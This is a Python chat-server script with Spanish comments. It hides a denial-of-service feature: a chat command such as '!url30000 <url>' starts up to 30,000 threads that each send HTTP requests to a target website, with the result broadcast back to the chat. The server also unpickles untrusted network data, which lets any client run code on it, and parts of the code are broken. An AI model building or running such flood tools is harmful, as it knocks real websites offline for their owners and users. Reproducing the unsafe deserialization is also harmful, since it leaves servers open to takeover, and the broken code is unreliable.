import socket
import threading
import sys
import pickle
import os
import requests

# puertos desde los 7000 (los anteriores se usan para cosas internas de os)


class Message():
    def __init__(self, username, msg):
        self.username = '<' + str(username) + '>'
        self.msg = msg


class Servidor():
    def __init__(self, host=socket.gethostname(), port=input("Escribe el puerto: ")):
        self.clientes = []
        self.mensajes = []
        self.attackResult = ''
        print("Tu ip es: " + socket.gethostbyname(host))
        self.sock = socket.socket()
        self.sock.bind((str(host), int(port)))
        self.sock.listen(4)
        self.sock.setblocking(False)

        aceptar = threading.Thread(target=self.aceptarC)
        procesar = threading.Thread(target=self.procesarC)

        aceptar.daemon = True
        aceptar.start()

        procesar.daemon = True
        procesar.start()

        # for thread in threading.enumerate():
        # print("Hilo: " + thread.name + "\n" + "Proceso PID: "+ str(os.getpid()) + "\n" + "Daemon: " + str(thread.daemon) +  "\n")
        # print("Hilos totales: " + str(threading.activeCount()-1))

        while True:
            msg = input('SALIR = Q\n')
            if msg == 'Q':
                closed = "**** SERVER CLOSED *****"
                for client in self.clientes:
                    self.broadcast(pickle.dumps(
                        Message('SERVER', closed)), client)
                self.sock.close()
                sys.exit()
            else:
                pass

    def SendAttackTo(self, url):
        try:
            sendTo = requests.get(url)
            sendTo
        except requests.exceptions.RequestException as e:
            self.attackResult = str(e)
            
    def AttackSetup(self, cuantity, url):
        for i in range(cuantity):
            t = threading.Thread(target=self.SendAttackTo, args=(url,))
            t.start()
        self.attackResult = str(requests.get(url))
    def HandleAttack(self, msg):
        message = pickle.loads(msg)
        if message.msg[0] == '!':
            
            if message.msg[0:9] == '!url30000':
                url = message.msg[10:len(message.msg)]
                print('url es 30000 : ', url)
                self.AttackSetup(30000,url)
                
            elif message.msg[0:8] == '!url3000':
                url = message.msg[9:len(message.msg)]
                print('url 3000 es : ', url)
                self.AttackSetup(3000,url)
                 
            elif message.msg[0:7] == '!url300':
                url = message.msg[8:len(message.msg)]
                print('url 300 es : ', url)
                self.AttackSetup(300,url)
                 
            elif message.msg[0:6] == '!url30':

                url = message.msg[7:len(message.msg)]
                print('url 30 es : ', url)
                self.AttackSetup(30,url)

                print("result:",self.attackResult)

                message.username = "<SERVER>"
                if len(self.attackResult) > 1: 
                    message.msg = self.attackResult
                else:
                    message.msg = "timeout from the server"
            for c in self.clientes:
                self.broadcast(pickle.dumps(message),c)
        else:
            for c in self.clientes:
                self.broadcast(msg,c)
            
    def broadcast(self, msg, cliente):

        message = pickle.loads(msg)
        print(message.username, message.msg)
        self.mensajes.append(message.username + message.msg)
        
        
        for c in self.clientes:
            try:
                # ¡¡if c != cliente:
                c.send(msg)
            except:
                self.clientes.remove(c)

    def aceptarC(self):
        while True:
            try:
                conn, addr = self.sock.accept()
                print(f"\nConexion aceptada via {conn}\n")
                conn.setblocking(False)
                self.clientes.append(conn)
                for client in self.clientes:
                    data = pickle.loads(client.username + 'connected')
                    self.broadcast(data, client)
            except:
                pass

    def procesarC(self):

        while True:
            if len(self.clientes) > 0:
                for c in self.clientes:
                    try:
                        data = c.recv(1024)
                        if data:
                            self.HandleAttack(data)
                    except:
                        pass


s = Servidor()
